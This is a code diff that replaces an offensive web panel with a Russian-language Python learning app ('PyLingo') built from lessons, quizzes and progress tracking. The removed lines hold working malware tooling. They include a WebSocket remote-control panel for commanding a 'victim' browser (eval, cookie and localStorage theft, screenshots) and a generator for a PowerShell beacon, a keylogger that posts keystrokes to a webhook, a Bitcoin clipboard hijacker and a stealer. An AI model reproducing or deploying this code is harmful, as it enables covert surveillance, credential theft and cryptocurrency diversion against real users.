+                                theory: '<h3>🧬 Типы</h3><p>Основные типы: <code>str</code> (строка), <code>int</code> (целое), <code>float</code> (дробное), <code>bool</code> (True/False).</p><pre>print(type("Привет"))  # <class \'str\'>\nprint(type(42))       # <class \'int\'></pre>',
+                                exercises: [
+                                    { type: 'mc', q: 'Какой тип у значения 3.14?', options: ['int', 'str', 'float',
+                                            'bool'], answer: 2 },
+                                ] },
+                            { id: 3, title: 'Преобразование типов',
+                                theory: '<h3>🔄 Конвертация</h3><p>Можно превращать типы: <code>int("5")</code> → 5, <code>str(10)</code> → "10".</p><pre>num = int("100")\nprint(num + 1)  # 101</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Преврати строку "25" в число, умножь на 2 и выведи результат',
+                                        answer: '50', hint: 'int("25") * 2' },
+                                ] },
+                            { id: 4, title: 'Итоги блока 2',
+                                theory: '<h3>🏆 Повторение</h3><p>Переменные, типы, конвертация — проверь себя!</p>',
+                                exercises: [
+                                    { type: 'code', q: 'Создай переменную <code>score</code> = 100, выведи score + 50',
+                                        answer: '150', hint: 'score = 100\\nprint(score + 50)' },
+                                ] },
+                        ],
+                    }, {
+                        id: 2,
+                        title: 'Блок 3: Условия',
+                        desc: 'if, else, elif, сравнения',
+                        lessons: [
+                            { id: 0, title: 'Операторы сравнения',
+                                theory: '<h3>⚖️ Сравнения</h3><p><code>==</code> равно, <code>!=</code> не равно, <code>></code> больше, <code><</code> меньше, <code>>=</code>, <code><=</code>.</p><pre>print(5 > 3)   # True\nprint(2 == 2)  # True</pre>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что выведет print(10 == 10)?', options: ['True', 'False', '10',
+                                            'Ошибка'], answer: 0 },
+                                ] },
+                            { id: 1, title: 'if — условие',
+                                theory: '<h3>🔀 if</h3><p>Конструкция <code>if</code> выполняет код только если условие истинно.</p><pre>age = 18\nif age >= 18:\n    print("Можно!")</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Напиши код: если x = 7 больше 5, выведи "Да" (используй if)',
+                                        answer: 'Да', hint: 'x = 7\\nif x > 5:\\n    print("Да")' },
+                                ] },
+                            { id: 2, title: 'else — иначе',
+                                theory: '<h3>↔️ else</h3><p><code>else</code> срабатывает когда условие в <code>if</code> ложно.</p><pre>x = 3\nif x > 5:\n    print("Да")\nelse:\n    print("Нет")</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'x = 3. Если x > 5 выведи "Больше", иначе — "Меньше"',
+                                        answer: 'Меньше', hint: 'Используй if/else' },
+                                ] },
+                            { id: 3, title: 'elif — несколько условий',
+                                theory: '<h3>🔀 elif</h3><p><code>elif</code> — это "иначе если". Можно проверять несколько условий подряд.</p><pre>score = 85\nif score >= 90:\n    print("A")\nelif score >= 80:\n    print("B")\nelse:\n    print("C")</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'score = 75. Если >= 90 выведи "A", иначе если >= 80 выведи "B", иначе "C"',
+                                        answer: 'C', hint: 'elif score >= 80: ... else: print("C")' },
+                                ] },
+                            { id: 4, title: 'Итоги блока 3',
+                                theory: '<h3>🏆 Финальный тест</h3><p>Проверь знания условий!</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что выведет: if False: print("A")\nelse: print("B")',
+                                        options: ['A', 'B', 'Ничего', 'Ошибка'], answer: 1 },
+                                ] },
+                        ],
+                    }, {
+                        id: 3,
+                        title: 'Блок 4: Циклы',
+                        desc: 'for, while, range',
+                        lessons: [
+                            { id: 0, title: 'Цикл for',
+                                theory: '<h3>🔁 for</h3><p>Цикл <code>for</code> повторяет действия. <code>range(n)</code> даёт числа от 0 до n-1.</p><pre>for i in range(5):\n    print(i)\n# 0 1 2 3 4</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Напиши цикл for с range(3), который выводит "Привет" на каждой итерации',
+                                        answer: 'Привет\nПривет\nПривет',
+                                        hint: 'for i in range(3):\\n    print("Привет")' },
+                                ] },
+                            { id: 1, title: 'Цикл while',
+                                theory: '<h3>🔄 while</h3><p><code>while</code> повторяется пока условие истинно.</p><pre>n = 3\nwhile n > 0:\n    print(n)\n    n = n - 1\n# 3 2 1</pre>',
+                                exercises: [
+                                    { type: 'mc', q: 'Сколько раз выполнится while x > 0 если x = 2 и x уменьшается на 1?',
+                                        options: ['1', '2', '3', '0'], answer: 1 },
+                                ] },
+                            { id: 2, title: 'for со списком',
+                                theory: '<h3>📋 for и список</h3><p>Можно перебирать элементы списка: <code>for item in [1,2,3]:</code></p><pre>fruits = ["яблоко", "банан"]\nfor f in fruits:\n    print(f)</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай список ["a","b","c"] и выведи каждый элемент через for',
+                                        answer: 'a\nb\nc', hint: 'for x in ["a","b","c"]:\\n    print(x)' },
+                                ] },
+                            { id: 3, title: 'break и continue',
+                                theory: '<h3>⏹️ break / continue</h3><p><code>break</code> прерывает цикл. <code>continue</code> пропускает итерацию.</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что делает break в цикле?', options: ['Паузу', 'Выход из цикла',
+                                            'Пропуск итерации', 'Ничего'], answer: 1 },
+                                ] },
+                            { id: 4, title: 'Итоги блока 4',
+                                theory: '<h3>🏆 Циклы — проверка</h3>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Напиши for i in range(4) и выведи i (каждое с новой строки)',
+                                        answer: '0\n1\n2\n3', hint: 'Простой for с range(4)' },
+                                ] },
+                        ],
+                    }, ],
+                },
+                pro: {
+                    units: [{
+                        id: 0,
+                        title: 'Pro: Функции глубоко',
+                        desc: 'lambda, args/kwargs, декораторы',
+                        lessons: [
+                            { id: 0, title: 'Функции — повторение',
+                                theory: '<h3>⚡ def</h3><p>Функции объявляются через <code>def</code>. Возвращают результат через <code>return</code>.</p><pre>def add(a, b):\n    return a + b\nprint(add(2,3))  # 5</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Напиши функцию multiply(a,b) которая возвращает a*b и выведи multiply(4,5)',
+                                        answer: '20', hint: 'def multiply(a,b): return a*b' },
+                                ] },
+                            { id: 1, title: 'Lambda-функции',
+                                theory: '<h3>λ lambda</h3><p>Анонимные функции в одну строку: <code>lambda x: x * 2</code></p><pre>square = lambda x: x**2\nprint(square(5))  # 25</pre>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай lambda-функцию, которая удваивает число, и примени к 7. Выведи результат.',
+                                        answer: '14', hint: 'f = lambda x: x*2\\nprint(f(7))' },
+                                ] },
+                            { id: 2, title: '*args и **kwargs',
+                                theory: '<h3>📦 *args</h3><p><code>*args</code> принимает любое количество позиционных аргументов. <code>**kwargs</code> — именованных.</p><pre>def sum_all(*args):\n    return sum(args)\nprint(sum_all(1,2,3))  # 6</pre>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что такое *args?', options: ['Список', 'Кортеж всех аргументов',
+                                            'Словарь', 'Строка'], answer: 1 },
+                                ] },
+                            { id: 3, title: 'Декораторы',
+                                theory: '<h3>🎭 Декоратор</h3><p>Функция, которая оборачивает другую функцию, добавляя поведение.</p><pre>def decorator(func):\n    def wrapper():\n        print("До")\n        func()\n        print("После")\n    return wrapper</pre>',
+                                exercises: [
+                                    { type: 'mc', q: 'Декоратор — это...',
+                                        options: ['Переменная', 'Функция, модифицирующая другую функцию', 'Цикл',
+                                            'Класс'], answer: 1 },
+                                ] },
+                            { id: 4, title: 'Итоги Pro-функций',
+                                theory: '<h3>🏆 Pro-тест</h3>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай lambda x: x+10 и примени к 5, выведи результат',
+                                        answer: '15', hint: 'print((lambda x: x+10)(5))' },
+                                ] },
+                        ],
+                    }, {
+                        id: 1,
+                        title: 'Pro: ООП',
+                        desc: 'Классы, наследование, методы',
+                        lessons: [
+                            { id: 0, title: 'Классы',
+                                theory: '<h3>🏗️ class</h3><p>Класс — шаблон для объектов. Содержит атрибуты и методы.</p><pre>class Dog:\n    def __init__(self, name):\n        self.name = name\n    def bark(self):\n        return "Гав!"</pre>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что такое __init__?', options: ['Метод', 'Конструктор класса',
+                                            'Переменная', 'Цикл'], answer: 1 },
+                                ] },
+                            { id: 1, title: 'Создание объектов',
+                                theory: '<h3>🆕 Экземпляры</h3><p>Объект создаётся вызовом класса: <code>my_dog = Dog("Шарик")</code></p>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай класс Cat с __init__(self, name) и методом meow(), возвращающим "Мяу!". Выведи meow()',
+                                        answer: 'Мяу!', hint: 'class Cat:\\n    def __init__(self,name): self.name=name\\n    def meow(self): return "Мяу!"' },
+                                ] },
+                            { id: 2, title: 'Наследование',
+                                theory: '<h3>🧬 Наследование</h3><p>Класс-наследник получает всё от родителя: <code>class Puppy(Dog):</code></p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Наследование позволяет...', options: ['Копировать код',
+                                            'Переиспользовать код родительского класса', 'Удалять методы',
+                                            'Игнорировать ошибки'], answer: 1 },
+                                ] },
+                            { id: 3, title: 'Магические методы',
+                                theory: '<h3>✨ __str__ и др.</h3><p><code>__str__</code> определяет строковое представление объекта.</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Какой метод для строкового представления?', options: ['__repr__',
+                                            '__str__', '__init__', '__call__'], answer: 1 },
+                                ] },
+                            { id: 4, title: 'Итоги ООП',
+                                theory: '<h3>🏆 ООП тест</h3>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай класс Car с __init__(self,brand) и методом info(), возвращающим brand. Выведи info() для Car("BMW")',
+                                        answer: 'BMW',
+                                        hint: 'class Car:\\n    def __init__(self,b): self.b=b\\n    def info(self): return self.b' },
+                                ] },
+                        ],
+                    }, {
+                        id: 2,
+                        title: 'Pro: Структуры данных',
+                        desc: 'Comprehensions, словари, множества',
+                        lessons: [
+                            { id: 0, title: 'List Comprehensions',
+                                theory: '<h3>📋 Генераторы списков</h3><p>Компактный способ создавать списки: <code>[x*2 for x in range(5)]</code> → <code>[0,2,4,6,8]</code></p>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай список квадратов чисел от 1 до 4 через list comprehension: [x**2 for x in range(1,5)]',
+                                        answer: '[1, 4, 9, 16]', hint: 'print([x**2 for x in range(1,5)])' },
+                                ] },
+                            { id: 1, title: 'Словари',
+                                theory: '<h3>📖 dict</h3><p>Пары ключ-значение: <code>{"key": "value"}</code>. Доступ: <code>d["key"]</code>.</p>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай словарь {"a":1,"b":2} и выведи значение по ключу "b"',
+                                        answer: '2', hint: 'd={"a":1,"b":2}\\nprint(d["b"])' },
+                                ] },
+                            { id: 2, title: 'Множества',
+                                theory: '<h3>🔮 set</h3><p>Множество — неупорядоченная коллекция уникальных элементов: <code>{1,2,3}</code></p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что содержит set([1,2,2,3])?', options: ['[1,2,2,3]', '{1,2,3}',
+                                            '{1,2,2,3}', 'Ошибку'], answer: 1 },
+                                ] },
+                            { id: 3, title: 'Dict Comprehensions',
+                                theory: '<h3>📖 Генераторы словарей</h3><p><code>{k:v for k,v in ...}</code></p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что создаст {x:x**2 for x in range(3)}?', options: ['{0:0,1:1,2:4}',
+                                            '[0,1,4]', '{0,1,4}', 'Ошибку'], answer: 0 },
+                                ] },
+                            { id: 4, title: 'Итоги структур',
+                                theory: '<h3>🏆 Финальный тест</h3>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Создай list comprehension [x for x in range(1,6) if x % 2 == 0] и выведи результат',
+                                        answer: '[2, 4]', hint: 'print([x for x in range(1,6) if x%2==0])' },
+                                ] },
+                        ],
+                    }, {
+                        id: 3,
+                        title: 'Pro: Ошибки и файлы',
+                        desc: 'try/except, чтение и запись',
+                        lessons: [
+                            { id: 0, title: 'try/except',
+                                theory: '<h3>🛡️ Обработка ошибок</h3><p><code>try</code> пробует выполнить код. Если ошибка — <code>except</code> перехватывает.</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что делает try?', options: ['Игнорирует ошибки',
+                                            'Пытается выполнить код', 'Завершает программу', 'Ничего'], answer: 1 },
+                                ] },
+                            { id: 1, title: 'Типы исключений',
+                                theory: '<h3>⚠️ ValueError, TypeError</h3><p>Разные ошибки: <code>ValueError</code>, <code>TypeError</code>, <code>ZeroDivisionError</code>.</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Какое исключение при делении на 0?', options: ['ValueError',
+                                            'TypeError', 'ZeroDivisionError', 'KeyError'], answer: 2 },
+                                ] },
+                            { id: 2, title: 'Чтение файлов',
+                                theory: '<h3>📂 open()</h3><p><code>with open("file.txt","r") as f:</code> — безопасное чтение.</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Режим "r" в open() означает...', options: ['Запись', 'Чтение',
+                                            'Дозапись', 'Удаление'], answer: 1 },
+                                ] },
+                            { id: 3, title: 'Запись в файл',
+                                theory: '<h3>✍️ write</h3><p>Режим <code>"w"</code> для записи (перезаписывает). <code>"a"</code> — дозапись.</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Режим "w" при открытии файла...', options: ['Читает',
+                                            'Перезаписывает файл', 'Дозаписывает', 'Удаляет файл'], answer: 1 },
+                                ] },
+                            { id: 4, title: 'Итоги Pro',
+                                theory: '<h3>🏆 Финальный тест Pro</h3>',
+                                exercises: [
+                                    { type: 'code',
+                                        q: 'Напиши try/except: попробуй print(1/0) и в except выведи "Ошибка!"',
+                                        answer: 'Ошибка!',
+                                        hint: 'try:\\n    print(1/0)\\nexcept:\\n    print("Ошибка!")' },
+                                ] },
+                        ],
+                    }, ],
+                },
             };
-            ws.onclose = () => {
-                document.getElementById('wsStatus').innerText = '❌ Отключено, переподключение...';
-                document.getElementById('wsStatus').style.color = '#ff8888';
-                setTimeout(connect, 3000);
-            };
-        }
-        connect();
-        document.getElementById('sendCmdBtn').onclick = () => {
-            if (!ws || ws.readyState !== WebSocket.OPEN) {
-                alert('Нет соединения с жертвой');
-                return;
+
+            // ============ DOM REFS ============
+            const content = document.getElementById('content');
+            const xpDisplay = document.getElementById('xpDisplay');
+            const streakDisplay = document.getElementById('streakDisplay');
+            const modeBadge = document.getElementById('modeBadge');
+            const confettiContainer = document.getElementById('confettiContainer');
+
+            // ============ HELPERS ============
+            function saveState() {
+                localStorage.setItem('pylingo_state', JSON.stringify({
+                    mode: state.mode,
+                    xp: state.xp,
+                    streak: state.streak,
+                    lastLessonDate: state.lastLessonDate,
+                    completedLessons: state.completedLessons,
+                }));
             }
-            const type = document.getElementById('cmdType').value;
-            let cmdValue = document.getElementById('cmdValue').value.trim();
-            let fullCmd = '';
-            if (type === 'alert') fullCmd = 'alert:' + cmdValue;
-            else if (type === 'redirect') fullCmd = 'redirect:' + cmdValue;
-            else if (type === 'eval') fullCmd = 'eval:' + cmdValue;
-            else if (type === 'click') fullCmd = 'click:' + cmdValue;
-            else if (type === 'scrollY') fullCmd = 'scrollY:' + cmdValue;
-            else fullCmd = type; // getCookies, getLocalStorage, screenshot
-            ws.send(JSON.stringify({ type: 'command', cmd: fullCmd }));
-            const respDiv = document.getElementById('responses');
-            const msg = document.createElement('div');
-            msg.style.color = '#ffcc88';
-            msg.innerHTML = `[SENT] ${fullCmd}`;
-            respDiv.appendChild(msg);
-            document.getElementById('cmdValue').value = '';
-        };
-    })();
 
-    // RAT генератор
-    function genMalware(name, type, wh) {
-        const safe = name.replace(/[^a-z0-9_]/gi,'_');
-        if (type === 'powershell_rat') return `# ${safe} RAT\n$webhook="${wh}"\n$ip=(Invoke-WebRequest api.ipify.org).Content\nInvoke-RestMethod -Uri $webhook -Method Post -Body (@{name="${safe}";ip=$ip}|ConvertTo-Json)`;
-        if (type === 'js_keylogger') return `// ${safe} keylogger\nlet k='';document.onkeydown=e=>{k+=e.key;if(k.length>30)fetch("${wh}",{method:'POST',body:k})};`;
-        if (type === 'locker_html') return `<html><body style="background:black;color:red"><h1>${safe} LOCKER</h1><script>alert('LOCKED');<\/script></body></html>`;
-        if (type === 'clipper') return `# ${safe} clipper\nAdd-Type -AssemblyName System.Windows.Forms\nwhile($true){$c=[System.Windows.Forms.Clipboard]::GetText();if($c-match"^1"){[System.Windows.Forms.Clipboard]::SetText("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")};Start-Sleep 2}`;
-        return `# ${safe} stealer\nInvoke-RestMethod -Uri "${wh}" -Method Post -Body (@{data="stolen"})`;
-    }
-    document.getElementById('generateRatCodeBtn').onclick = () => {
-        const name = document.getElementById('malName').value;
-        const type = document.getElementById('malType').value;
-        const wh = document.getElementById('webhookRat').value || 'https://webhook.site';
-        const code = genMalware(name, type, wh);
-        document.getElementById('generatedCodeArea').value = code;
-        document.getElementById('ratResultArea').style.display = 'block';
-    };
-    document.getElementById('copyCodeBtn').onclick = () => {
-        const area = document.getElementById('generatedCodeArea');
-        area.select(); document.execCommand('copy'); alert('Код скопирован');
-    };
+            function loadState() {
+                const saved = localStorage.getItem('pylingo_state');
+                if (saved) {
+                    try {
+                        const data = JSON.parse(saved);
+                        state.mode = data.mode || null;
+                        state.xp = data.xp || 0;
+                        state.streak = data.streak || 0;
+                        state.lastLessonDate = data.lastLessonDate || null;
+                        state.completedLessons = data.completedLessons || {};
+                    } catch (e) {
+                        console.log('Ошибка загрузки состояния');
+                    }
+                }
+            }
 
-    // Чат: свернуть/развернуть
-    const chat = document.getElementById('liveChat');
-    document.getElementById('toggleChatBtn').onclick = () => {
-        chat.classList.toggle('chat-collapsed');
-        document.getElementById('toggleChatBtn').innerText = chat.classList.contains('chat-collapsed') ? '+' : '−';
-    };
-    document.getElementById('clearChatBtn').onclick = () => { if(confirm('Очистить логи?')) clearAllLogs(); };
+            function updateTopBar() {
+                xpDisplay.textContent = state.xp + ' XP';
+                streakDisplay.textContent = state.streak;
+                if (state.mode === 'pro') {
+                    modeBadge.textContent = '⚡ PRO';
+                    modeBadge.className = 'mode-badge pro';
+                } else if (state.mode === 'student') {
+                    modeBadge.textContent = '👨‍🎓 Студент';
+                    modeBadge.className = 'mode-badge student';
+                } else {
+                    modeBadge.textContent = '❓ Выбор';
+                    modeBadge.className = 'mode-badge student';
+                }
+            }
 
-    // Переключение вкладок
-    const tabBtns = document.querySelectorAll('[data-logtab]');
-    const contents = {
-        stealth: 'stealthTab', driveby: 'drivebyTab', cardstealer: 'cardstealerTab',
-        phish: 'phishTab', checker: 'checkerTab', rat: 'ratTabContent', remote: 'remoteTab'
-    };
-    function switchTab(tabId) {
-        Object.values(contents).forEach(id => { const el = document.getElementById(id); if (el) el.style.display = 'none'; });
-        const activeEl = document.getElementById(contents[tabId]);
-        if (activeEl) activeEl.style.display = 'block';
-        tabBtns.forEach(btn => btn.classList.toggle('active', btn.getAttribute('data-logtab') === tabId));
-    }
-    tabBtns.forEach(btn => btn.addEventListener('click', () => switchTab(btn.getAttribute('data-logtab'))));
+            function getUnitData() {
+                if (!state.mode) return [];
+                return lessonData[state.mode].units;
+            }
 
-    renderChatLogs();
-    switchTab('stealth');
-</script>
+            function makeLessonKey(unitId, lessonId) {
+                return state.mode + '-' + unitId + '-' + lessonId;
+            }
+
+            function isLessonCompleted(unitId, lessonId) {
+                return state.completedLessons[makeLessonKey(unitId, lessonId)] === true;
+            }
+
+            function completeLesson(unitId, lessonId) {
+                state.completedLessons[makeLessonKey(unitId, lessonId)] = true;
+                state.xp += 15;
+                // Streak
+                const today = new Date().toDateString();
+                if (state.lastLessonDate !== today) {
+                    if (state.lastLessonDate) {
+                        const yesterday = new Date(Date.now() - 86400000).toDateString();
+                        if (state.lastLessonDate === yesterday) {
+                            state.streak += 1;
+                        } else {
+                            state.streak = 1;
+                        }
+                    } else {
+                        state.streak = 1;
+                    }
+                    state.lastLessonDate = today;
+                }
+                saveState();
+                updateTopBar();
+            }
+
+            function getNextLesson() {
+                const units = getUnitData();
+                for (const unit of units) {
+                    for (const lesson of unit.lessons) {
+                        if (!isLessonCompleted(unit.id, lesson.id)) {
+                            return { unit, lesson, unitId: unit.id, lessonId: lesson.id };
+                        }
+                    }
+                }
+                return null; // All completed
+            }
+
+            function renderScreen(screenName, data = {}) {
+                state.currentScreen = screenName;
+                state.currentLessonKey = data.lessonKey || null;
+                state.currentExerciseIndex = 0;
+                state.exerciseAttempts = 0;
+                content.innerHTML = '';
+                const screen = document.createElement('div');
+                screen.className = 'screen active';
+
+                switch (screenName) {
+                    case 'welcome':
+                        renderWelcome(screen);
+                        break;
+                    case 'path':
+                        renderPath(screen);
+                        break;
+                    case 'lesson':
+                        renderLesson(screen, data);
+                        break;
+                    case 'complete':
+                        renderComplete(screen, data);
+                        break;
+                    default:
+                        renderWelcome(screen);
+                }
+                content.appendChild(screen);
+                content.scrollTop = 0;
+            }
+
+            function renderWelcome(screen) {
+                screen.classList.add('welcome');
+                screen.innerHTML = `
+                    <h1>Добро пожаловать<br>в <span class="py">PyLingo</span> 🐍</h1>
+                    <p>Изучай Python как в Duolingo — уроки, практика, прогресс. Выбери свой путь:</p>
+                    <div class="choice-cards">
+                        <div class="choice-card" id="chooseStudent">
+                            <div class="emoji">👨‍🎓</div>
+                            <h3>Студент</h3>
+                            <span class="tag beginner">С нуля</span>
+                            <small>Основы Python: переменные, циклы, условия. Для начинающих.</small>
+                        </div>
+                        <div class="choice-card pro-choice" id="choosePro">
+                            <div class="emoji">⚡</div>
+                            <h3>PRO</h3>
+                            <span class="tag advanced">Продвинутый</span>
+                            <small>Функции, ООП, декораторы, файлы. Для опытных.</small>
+                        </div>
+                    </div>
+                    ${state.mode ? `<p style="color:var(--text2);font-size:0.85em;">У тебя есть сохранённый прогресс в режиме <b>${state.mode === 'pro' ? 'PRO' : 'Студент'}</b>. <button class="btn btn-outline btn-sm" id="resumeBtn">Продолжить →</button></p>` : ''}
+                `;
+                // Event listeners
+                setTimeout(() => {
+                    const cs = document.getElementById('chooseStudent');
+                    const cp = document.getElementById('choosePro');
+                    const rb = document.getElementById('resumeBtn');
+                    if (cs) cs.addEventListener('click', () => selectMode('student'));
+                    if (cp) cp.addEventListener('click', () => selectMode('pro'));
+                    if (rb) rb.addEventListener('click', () => renderScreen('path'));
+                }, 50);
+            }
+
+            function selectMode(mode) {
+                state.mode = mode;
+                state.completedLessons = {};
+                state.xp = 0;
+                state.streak = 0;
+                state.lastLessonDate = null;
+                saveState();
+                updateTopBar();
+                spawnConfetti();
+                renderScreen('path');
+            }
+
+            function renderPath(screen) {
+                if (!state.mode) { renderScreen('welcome'); return; }
+                const units = getUnitData();
+                const nextLesson = getNextLesson();
+                let html = '<h2 style="font-weight:800;">📚 Твой путь обучения</h2>';
+                html +=
+                    '<p style="color:var(--text2);font-size:0.85em;">Проходи уроки по порядку. За каждый урок +15 XP ⚡</p>';
+
+                for (const unit of units) {
+                    const allDone = unit.lessons.every(l => isLessonCompleted(unit.id, l.id));
+                    html += `<div class="unit-block ${state.mode==='pro'?'pro-unit':''}">
+                        <h4>${allDone ? '✅ ' : ''}${unit.title}</h4>
+                        <div class="unit-desc">${unit.desc}</div>
+                        <div class="lesson-row">`;
+                    for (const lesson of unit.lessons) {
+                        const completed = isLessonCompleted(unit.id, lesson.id);
+                        const isCurrent = nextLesson && nextLesson.unitId === unit.id && nextLesson.lessonId === lesson
+                            .id;
+                        let cls = '';
+                        if (completed) cls = state.mode === 'pro' ? 'pro-completed' : 'completed';
+                        else if (isCurrent) cls = 'current';
+                        else cls = 'locked';
+                        const icon = completed ? '✓' : (isCurrent ? '▶' : '🔒');
+                        html +=
+                            `<div class="lesson-node ${cls}" data-unit="${unit.id}" data-lesson="${lesson.id}" title="${lesson.title}">${icon}</div>`;
+                    }
+                    html += '</div></div>';
+                }
+                screen.innerHTML = html;
+
+                // Click handlers
+                setTimeout(() => {
+                    const nodes = screen.querySelectorAll('.lesson-node');
+                    nodes.forEach(node => {
+                        node.addEventListener('click', () => {
+                            const unitId = parseInt(node.dataset.unit);
+                            const lessonId = parseInt(node.dataset.lesson);
+                            const completed = isLessonCompleted(unitId, lessonId);
+                            const isCurrent = nextLesson && nextLesson.unitId === unitId && nextLesson
+                                .lessonId === lessonId;
+                            if (completed || isCurrent) {
+                                openLesson(unitId, lessonId);
+                            } else {
+                                shakeElement(node);
+                            }
+                        });
+                    });
+                }, 50);
+            }
+
+            function openLesson(unitId, lessonId) {
+                const units = getUnitData();
+                const unit = units.find(u => u.id === unitId);
+                if (!unit) return;
+                const lesson = unit.lessons.find(l => l.id === lessonId);
+                if (!lesson) return;
+                renderScreen('lesson', { unit, lesson, unitId, lessonId });
+            }
+
+            function renderLesson(screen, data) {
+                const { unit, lesson, unitId, lessonId } = data;
+                state.currentLessonKey = makeLessonKey(unitId, lessonId);
+                state.currentExerciseIndex = 0;
+                state.exerciseAttempts = 0;
+
+                let html = `
+                    <button class="btn btn-outline btn-sm" id="backToPath">← К урокам</button>
+                    <h3 style="font-weight:700;">${lesson.title}</h3>
+                    <div class="lesson-theory">${lesson.theory}</div>
+                    <div id="exerciseContainer"></div>
+                    <div class="feedback" id="feedback"></div>
+                    <div class="btn-row" id="btnRow">
+                        <button class="btn btn-primary" id="checkBtn">✅ Проверить</button>
+                        <button class="btn btn-outline btn-sm" id="hintBtn">💡 Подсказка</button>
+                    </div>
+                    <div class="sandbox-output" id="sandboxOutput" style="display:none;"></div>
+                `;
+                screen.innerHTML = html;
+                screen.dataset.unitId = unitId;
+                screen.dataset.lessonId = lessonId;
+
+                renderExercise(screen, lesson, 0);
+
+                setTimeout(() => {
+                    const backBtn = document.getElementById('backToPath');
+                    if (backBtn) backBtn.addEventListener('click', () => renderScreen('path'));
+                    const checkBtn = document.getElementById('checkBtn');
+                    const hintBtn = document.getElementById('hintBtn');
+                    if (checkBtn) checkBtn.addEventListener('click', () => checkExercise(screen, lesson));
+                    if (hintBtn) hintBtn.addEventListener('click', () => showHint(lesson));
+                }, 50);
+            }
+
+            function renderExercise(screen, lesson, index) {
+                const container = document.getElementById('exerciseContainer');
+                if (!container) return;
+                const ex = lesson.exercises[index];
+                if (!ex) return;
+                state.currentExerciseIndex = index;
+                state.exerciseAttempts = 0;
+                const fb = document.getElementById('feedback');
+                if (fb) { fb.className = 'feedback';
+                    fb.textContent = ''; }
+                const sandboxOut = document.getElementById('sandboxOutput');
+                if (sandboxOut) sandboxOut.style.display = 'none';
+
+                let exHTML = `<div class="exercise-box" id="exerciseBox">
+                    <div class="q">📝 <b>Задание ${index+1}/${lesson.exercises.length}:</b> ${ex.q}</div>`;
+
+                if (ex.type === 'code') {
+                    exHTML +=
+                        `<textarea id="codeInput" placeholder="Введи свой Python-код здесь...">${ex._savedCode || ''}</textarea>`;
+                } else if (ex.type === 'mc') {
+                    exHTML += '<div class="mc-options">';
+                    ex.options.forEach((opt, i) => {
+                        exHTML +=
+                            `<div class="mc-option" data-index="${i}" id="mcOpt${i}">${String.fromCharCode(65+i)}) ${opt}</div>`;
+                    });
+                    exHTML += '</div>';
+                }
+
+                exHTML += '</div>';
+                container.innerHTML = exHTML;
+
+                // MC click handlers
+                if (ex.type === 'mc') {
+                    setTimeout(() => {
+                        ex.options.forEach((_, i) => {
+                            const optEl = document.getElementById('mcOpt' + i);
+                            if (optEl) {
+                                optEl.addEventListener('click', () => {
+                                    document.querySelectorAll('.mc-option').forEach(o => o.classList
+                                        .remove('selected'));
+                                    optEl.classList.add('selected');
+                                    optEl.dataset.selected = 'true';
+                                });
+                            }
+                        });
+                    }, 50);
+                }
+
+                // Save code on input
+                if (ex.type === 'code') {
+                    setTimeout(() => {
+                        const codeInput = document.getElementById('codeInput');
+                        if (codeInput) {
+                            codeInput.addEventListener('input', () => {
+                                ex._savedCode = codeInput.value;
+                            });
+                            if (ex._savedCode) codeInput.value = ex._savedCode;
+                        }
+                    }, 50);
+                }
+
+                // Update button
+                const checkBtn = document.getElementById('checkBtn');
+                const btnRow = document.getElementById('btnRow');
+                if (checkBtn) checkBtn.textContent = '✅ Проверить';
+                if (checkBtn) checkBtn.disabled = false;
+                if (btnRow) btnRow.style.display = 'flex';
+                const hintBtn = document.getElementById('hintBtn');
+                if (hintBtn) hintBtn.style.display = 'inline-flex';
+            }
+
+            function checkExercise(screen, lesson) {
+                const ex = lesson.exercises[state.currentExerciseIndex];
+                if (!ex) return;
+                const fb = document.getElementById('feedback');
+                const exerciseBox = document.getElementById('exerciseBox');
+                const sandboxOut = document.getElementById('sandboxOutput');
+
+                let isCorrect = false;
+                let userAnswer = '';
+
+                if (ex.type === 'code') {
+                    const codeInput = document.getElementById('codeInput');
+                    if (!codeInput) return;
+                    const code = codeInput.value.trim();
+                    ex._savedCode = code;
+                    if (!code) {
+                        showFeedback('Напиши код! 😅', 'error');
+                        return;
+                    }
+                    try {
+                        const output = py.run(code);
+                        userAnswer = output.trim();
+                        const expected = ex.answer.trim();
+                        // Normalize comparison
+                        const normOut = output.trim().replace(/\s+/g, ' ');
+                        const normExp = expected.replace(/\s+/g, ' ');
+                        if (normOut === normExp || output.trim() === expected.trim()) {
+                            isCorrect = true;
+                        } else {
+                            // Check if output contains expected
+                            if (output.trim().includes(expected.trim()) && expected.trim().length > 0) {
+                                isCorrect = true;
+                            }
+                        }
+                        if (sandboxOut) {
+                            sandboxOut.style.display = 'block';
+                            sandboxOut.textContent = '🖥️ Вывод твоего кода:\n' + (output || '(пусто)');
+                            sandboxOut.style.color = isCorrect ? '#6be010' : '#ff6b6b';
+                        }
+                    } catch (e) {
+                        userAnswer = 'ОШИБКА: ' + e.message;
+                        if (sandboxOut) {
+                            sandboxOut.style.display = 'block';
